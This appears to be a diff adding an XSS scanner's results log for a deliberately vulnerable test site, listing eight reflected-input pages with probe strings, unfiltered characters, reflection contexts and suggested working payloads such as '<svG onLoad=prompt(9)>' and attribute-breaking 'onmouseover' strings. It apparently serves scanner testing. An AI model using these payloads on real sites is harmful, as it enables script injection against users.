@@ -1,0 +1,76 @@
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+response URL: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+POST url: https://xss-suite-test-site.herokuapp.com/pages/post_simple_tag.php
+Unfiltered: '"(){}<x>:/;
+Payload: 1zqjtp'"(){}<x>:/1zqjtp;9
+Type: form
+Injection point: xss
+Possible payloads: <svG onLoad=prompt(9)>
+Line: <div>1zqjtp'"(){}<x>:/1zqjtp;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_comment.php?xss=1zqjac'%22()%7B%7D%3Cx%3E:/1zqjac;9
+Unfiltered: '"(){}<x>:/;
+Payload: 1zqjac'"(){}<x>:/1zqjac;9
+Type: url
+Injection point: xss
+Possible payloads: --><svG onLoad=prompt(9)>
+Line: <!-- 1zqjac'"(){}<x>:/1zqjac;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_tag.php?xss=1zqjrn'%22()%7B%7D%3Cx%3E:/1zqjrn;9
+Unfiltered: '"(){}<x>:/;
+Payload: 1zqjrn'"(){}<x>:/1zqjrn;9
+Type: url
+Injection point: xss
+Possible payloads: <svG onLoad=prompt(9)>
+Line: <div>1zqjrn'"(){}<x>:/1zqjrn;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php?xss=1zqjxn'%22()%7B%7D%3Cx%3E:/1zqjxn;9
+Unfiltered: '"(){}<x>:/;
+Payload: 1zqjxn'"(){}<x>:/1zqjxn;9
+Type: url
+Injection point: xss
+Possible payloads: </SCript><svG/onLoad=prompt(9)>, x";prompt(9);
+Line: <script>
+            var xss = "1zqjxn'"(){}<x>:/1zqjxn;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php?xss=1zqjyn'%22()%7B%7D%3Cx%3E:/1zqjyn;9
+Unfiltered: '(){}x:/;
+Payload: 1zqjyn'"(){}<x>:/1zqjyn;9
+Type: url
+Injection point: xss
+Possible payloads: ;prompt(9);
+Line: <script>
+            var xss = `1zqjyn'&quot;(){}&lt;x&gt;:/1zqjyn;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php?xss=1zqjmd'%22()%7B%7D%3Cx%3E:/1zqjmd;9
+Unfiltered: '(){}x:/;
+Payload: 1zqjmd'"(){}<x>:/1zqjmd;9
+Type: url
+Injection point: xss
+Possible payloads: x';prompt(9);
+Line: <script>
+            var xss = '1zqjmd'&quot;(){}&lt;x&gt;:/1zqjmd;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php?xss=1zqjle'%22()%7B%7D%3Cx%3E:/1zqjle;9
+Unfiltered: '(){}x:/;
+Payload: 1zqjle'"(){}<x>:/1zqjle;9
+Type: url
+Injection point: xss
+Possible payloads: ;prompt(9);
+Line: <img src="/img/xss-meme.jpg" alt="funny meme" onload="1zqjle'&quot;(){}&lt;x&gt;:/1zqjle;9
+
+URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=234
+response URL: https://xss-suite-test-site.herokuapp.com/pages/simple_value.php?xss=1zqjit'%22()%7B%7D%3Cx%3E:/1zqjit;9
+Unfiltered: '"(){}<x>:/;
+Payload: 1zqjit'"(){}<x>:/1zqjit;9
+Type: url
+Injection point: xss
+Possible payloads: x"/onmouseover=prompt(9)/", x"><svG onLoad=prompt(9)>, x" onmouseover=prompt(9) "
+Line: <input name="xss" value="1zqjit'"(){}<x>:/1zqjit;9
